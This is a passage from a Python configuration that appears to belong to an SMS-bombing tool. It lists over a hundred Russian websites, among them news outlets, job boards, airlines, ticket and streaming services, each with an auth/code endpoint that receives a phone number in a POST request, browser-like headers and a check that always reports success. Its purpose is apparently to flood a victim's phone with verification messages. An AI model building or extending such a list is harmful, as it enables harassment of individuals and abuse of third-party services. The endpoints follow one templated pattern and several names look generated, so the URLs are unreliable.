        "name": "RamblerHealth",
        "url": "https://rambler.ru/health/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rambler.ru/", "https://rambler.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1404": {
        "name": "RИАHealth",
        "url": "https://ria.ru/society/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ria.ru/", "https://ria.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1405": {
        "name": "TASSHealth",
        "url": "https://tass.ru/obshchestvo/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tass.ru/", "https://tass.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1406": {
        "name": "VedomostiHealth",
        "url": "https://vedomosti.ru/society/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vedomosti.ru/", "https://vedomosti.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1407": {
        "name": "KommersantHealth",
        "url": "https://kommersant.ru/theme/809/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kommersant.ru/", "https://kommersant.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1408": {
        "name": "RBCHealth",
        "url": "https://rbc.ru/society/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rbc.ru/", "https://rbc.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1409": {
        "name": "ForbesHealth",
        "url": "https://forbes.ru/society/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://forbes.ru/", "https://forbes.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1410": {
        "name": "SnobHealth",
        "url": "https://snob.ru/profile/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://snob.ru/", "https://snob.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1411": {
        "name": "EsquireHealth",
        "url": "https://esquire.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://esquire.ru/", "https://esquire.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1412": {
        "name": "GQHealth",
        "url": "https://gq.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gq.ru/", "https://gq.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1413": {
        "name": "VogueHealth",
        "url": "https://vogue.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vogue.ru/", "https://vogue.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1414": {
        "name": "ElleHealth",
        "url": "https://elle.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://elle.ru/", "https://elle.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1415": {
        "name": "CosmoHealth",
        "url": "https://cosmo.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://cosmo.ru/", "https://cosmo.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1416": {
        "name": "WomanHealth",
        "url": "https://woman.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://woman.ru/", "https://woman.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1417": {
        "name": "MarieClaireHealth",
        "url": "https://marieclaire.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://marieclaire.ru/", "https://marieclaire.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1418": {
        "name": "GraziaHealth",
        "url": "https://grazia.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://grazia.ru/", "https://grazia.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1419": {
        "name": "GlamourHealth",
        "url": "https://glamour.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://glamour.ru/", "https://glamour.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1420": {
        "name": "MenHealth",
        "url": "https://mhealth.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mhealth.ru/", "https://mhealth.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1421": {
        "name": "MaximHealth",
        "url": "https://maximonline.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://maximonline.ru/", "https://maximonline.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1422": {
        "name": "PlayboyHealth",
        "url": "https://playboyrussia.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://playboyrussia.com/", "https://playboyrussia.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1423": {
        "name": "PsychologiesHealth",
        "url": "https://psychologies.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://psychologies.ru/", "https://psychologies.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1424": {
        "name": "NationalGeographicRu",
        "url": "https://nat-geo.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nat-geo.ru/", "https://nat-geo.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1425": {
        "name": "VokrugSveta",
        "url": "https://vokrugsveta.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vokrugsveta.ru/", "https://vokrugsveta.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1426": {
        "name": "GeoRu",
        "url": "https://geo.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://geo.ru/", "https://geo.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1427": {
        "name": "PopMechanics",
        "url": "https://popmech.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://popmech.ru/", "https://popmech.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1428": {
        "name": "TechInsider",
        "url": "https://techinsider.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://techinsider.ru/", "https://techinsider.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1429": {
        "name": "NaukaPervye",
        "url": "https://nauka.tass.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nauka.tass.ru/", "https://nauka.tass.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1430": {
        "name": "NPlus1",
        "url": "https://nplus1.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nplus1.ru/", "https://nplus1.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1431": {
        "name": "IndicatorRu",
        "url": "https://indicator.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://indicator.ru/", "https://indicator.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1432": {
        "name": "Chrdk",
        "url": "https://chrdk.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://chrdk.ru/", "https://chrdk.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1433": {
        "name": "PostNauka",
        "url": "https://postnauka.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://postnauka.ru/", "https://postnauka.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1434": {
        "name": "CyberLeninka",
        "url": "https://cyberleninka.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://cyberleninka.ru/", "https://cyberleninka.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1435": {
        "name": "HabrQnA",
        "url": "https://qna.habr.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://qna.habr.com/", "https://qna.habr.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1436": {
        "name": "Toster",
        "url": "https://toster.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://toster.ru/", "https://toster.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1437": {
        "name": "HabrCareer",
        "url": "https://career.habr.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://career.habr.com/", "https://career.habr.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1438": {
        "name": "HabrFreelance",
        "url": "https://freelance.habr.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://freelance.habr.com/", "https://freelance.habr.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1439": {
        "name": "FlRu",
        "url": "https://fl.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://fl.ru/", "https://fl.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1440": {
        "name": "WorkRu",
        "url": "https://work.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://work.ru/", "https://work.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1441": {
        "name": "SuperJob",
        "url": "https://superjob.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://superjob.ru/", "https://superjob.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1442": {
        "name": "HeadHunter",
        "url": "https://hh.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://hh.ru/", "https://hh.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1443": {
        "name": "AvitoWork",
        "url": "https://avito.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://avito.ru/", "https://avito.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1444": {
        "name": "ProfiRu",
        "url": "https://profi.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://profi.ru/", "https://profi.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1445": {
        "name": "YouDo",
        "url": "https://youdo.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://youdo.com/", "https://youdo.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1446": {
        "name": "Kwork",
        "url": "https://kwork.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kwork.ru/", "https://kwork.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1447": {
        "name": "Weblancer",
        "url": "https://weblancer.net/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://weblancer.net/", "https://weblancer.net", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1448": {
        "name": "FreelanceRu",
        "url": "https://freelance.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://freelance.ru/", "https://freelance.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1449": {
        "name": "PiterSearch",
        "url": "https://job-mo.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://job-mo.ru/", "https://job-mo.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1450": {
        "name": "TrudVsem",
        "url": "https://trudvsem.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://trudvsem.ru/", "https://trudvsem.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1451": {
        "name": "RabotaRu",
        "url": "https://rabota.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rabota.ru/", "https://rabota.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1452": {
        "name": "ZarplataRu",
        "url": "https://zarplata.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://zarplata.ru/", "https://zarplata.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1453": {
        "name": "JobRu",
        "url": "https://job.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://job.ru/", "https://job.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1454": {
        "name": "Careerist",
        "url": "https://careerist.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://careerist.ru/", "https://careerist.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1455": {
        "name": "SuperJobManager",
        "url": "https://superjob.ru/clients/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://superjob.ru/", "https://superjob.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1456": {
        "name": "HHEmployer",
        "url": "https://hh.ru/employer/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://hh.ru/", "https://hh.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1457": {
        "name": "OtzyvRu",
        "url": "https://otzyv.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://otzyv.ru/", "https://otzyv.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1458": {
        "name": "Irecommend",
        "url": "https://irecommend.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://irecommend.ru/", "https://irecommend.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1459": {
        "name": "Otzovik",
        "url": "https://otzovik.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://otzovik.com/", "https://otzovik.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1460": {
        "name": "Flamp",
        "url": "https://flamp.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://flamp.ru/", "https://flamp.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1461": {
        "name": "YandexMaps",
        "url": "https://yandex.ru/maps/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://yandex.ru/", "https://yandex.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1462": {
        "name": "GoogleMapsRu",
        "url": "https://google.ru/maps/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://google.ru/", "https://google.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1463": {
        "name": "2GIS",
        "url": "https://2gis.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://2gis.ru/", "https://2gis.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1464": {
        "name": "Zoon",
        "url": "https://zoon.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://zoon.ru/", "https://zoon.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1465": {
        "name": "SprRu",
        "url": "https://spr.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://spr.ru/", "https://spr.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1466": {
        "name": "YellowPagesRu",
        "url": "https://yp.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://yp.ru/", "https://yp.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1467": {
        "name": "AvtobusRu",
        "url": "https://avtobus.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://avtobus.ru/", "https://avtobus.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1468": {
        "name": "TutuRu",
        "url": "https://tutu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tutu.ru/", "https://tutu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1469": {
        "name": "RZD",
        "url": "https://rzd.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rzd.ru/", "https://rzd.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1470": {
        "name": "Aeroflot",
        "url": "https://aeroflot.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://aeroflot.ru/", "https://aeroflot.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1471": {
        "name": "S7Airlines",
        "url": "https://s7.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://s7.ru/", "https://s7.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1472": {
        "name": "UralAirlines",
        "url": "https://uralairlines.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://uralairlines.ru/", "https://uralairlines.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1473": {
        "name": "UTair",
        "url": "https://utair.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://utair.ru/", "https://utair.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1474": {
        "name": "Pobeda",
        "url": "https://pobeda.aero/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://pobeda.aero/", "https://pobeda.aero", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1475": {
        "name": "Nordwind",
        "url": "https://nordwindairlines.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nordwindairlines.ru/", "https://nordwindairlines.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1476": {
        "name": "RedWings",
        "url": "https://flyredwings.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://flyredwings.com/", "https://flyredwings.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1477": {
        "name": "AzimutAero",
        "url": "https://azimuth.aero/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://azimuth.aero/", "https://azimuth.aero", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1478": {
        "name": "YakutiaAirlines",
        "url": "https://yakutia.aero/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://yakutia.aero/", "https://yakutia.aero", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1479": {
        "name": "AlrosaAero",
        "url": "https://alrosa.aero/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://alrosa.aero/", "https://alrosa.aero", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1480": {
        "name": "YamalAirlines",
        "url": "https://yamal.aero/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://yamal.aero/", "https://yamal.aero", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1481": {
        "name": "Aviasales",
        "url": "https://aviasales.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://aviasales.ru/", "https://aviasales.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1482": {
        "name": "OneTwoTrip",
        "url": "https://onetwotrip.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://onetwotrip.com/", "https://onetwotrip.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1483": {
        "name": "Ostrovok",
        "url": "https://ostrovok.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ostrovok.ru/", "https://ostrovok.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1484": {
        "name": "LevelTravel",
        "url": "https://level.travel/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://level.travel/", "https://level.travel", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1485": {
        "name": "Travelata",
        "url": "https://travelata.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://travelata.ru/", "https://travelata.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1486": {
        "name": "SvyaznoyTravel",
        "url": "https://travel.svyaznoy.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://travel.svyaznoy.ru/", "https://travel.svyaznoy.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1487": {
        "name": "YandexTravel",
        "url": "https://travel.yandex.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://travel.yandex.ru/", "https://travel.yandex.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1488": {
        "name": "MTSTheatre",
        "url": "https://ticket.mts.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ticket.mts.ru/", "https://ticket.mts.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1489": {
        "name": "KassirRu",
        "url": "https://kassir.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kassir.ru/", "https://kassir.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1490": {
        "name": "AfishaRu",
        "url": "https://afisha.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://afisha.ru/", "https://afisha.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1491": {
        "name": "RamblerKassa",
        "url": "https://rambler.ru/kassa/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rambler.ru/", "https://rambler.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1492": {
        "name": "YandexAfisha",
        "url": "https://afisha.yandex.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://afisha.yandex.ru/", "https://afisha.yandex.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1493": {
        "name": "Ponominalu",
        "url": "https://ponominalu.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ponominalu.ru/", "https://ponominalu.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1494": {
        "name": "Ticketland",
        "url": "https://ticketland.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ticketland.ru/", "https://ticketland.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1495": {
        "name": "ParterRu",
        "url": "https://parter.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://parter.ru/", "https://parter.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1496": {
        "name": "ConcertRu",
        "url": "https://concert.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://concert.ru/", "https://concert.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1497": {
        "name": "Redkassa",
        "url": "https://redkassa.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://redkassa.ru/", "https://redkassa.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1498": {
        "name": "Kinopoisk",
        "url": "https://kinopoisk.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kinopoisk.ru/", "https://kinopoisk.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1499": {
        "name": "Okko",
        "url": "https://okko.tv/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://okko.tv/", "https://okko.tv", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1500": {
        "name": "Ivi",
        "url": "https://ivi.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ivi.ru/", "https://ivi.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1501": {
        "name": "Kion",
        "url": "https://kion.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kion.ru/", "https://kion.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1502": {
        "name": "Premier",
        "url": "https://premier.one/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://premier.one/", "https://premier.one", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1503": {
        "name": "Start",
        "url": "https://start.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://start.ru/", "https://start.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1504": {
        "name": "Wink",
        "url": "https://wink.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://wink.ru/", "https://wink.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1505": {
        "name": "MoreTV",
        "url": "https://more.tv/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://more.tv/", "https://more.tv", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1506": {
        "name": "OkkoTV",
        "url": "https://okko.tv/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://okko.tv/", "https://okko.tv", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1507": {
        "name": "Megogo",
        "url": "https://megogo.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://megogo.ru/", "https://megogo.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1508": {
        "name": "Tvzavr",
        "url": "https://tvzavr.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tvzavr.ru/", "https://tvzavr.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1509": {
        "name": "Boom",
        "url": "https://boom.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://boom.ru/", "https://boom.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1510": {
        "name": "YandexMusic",
        "url": "https://music.yandex.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://music.yandex.ru/", "https://music.yandex.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1511": {
        "name": "SberSound",
        "url": "https://sbersound.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sbersound.ru/", "https://sbersound.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1512": {
        "name": "VKMusic",
        "url": "https://vk.com/music/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://vk.com/", "https://vk.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1513": {
        "name": "Zvooq",
        "url": "https://zvooq.pro/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://zvooq.pro/", "https://zvooq.pro", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1514": {
        "name": "DeezerRu",
        "url": "https://deezer.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://deezer.com/", "https://deezer.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1515": {
        "name": "SpotifyRu",
        "url": "https://spotify.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://spotify.com/", "https://spotify.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api1516": {
        "name": "AppleMusicRu",
        "url": "https://music.apple.com/api/v1/auth/code",
        "method": "POST",
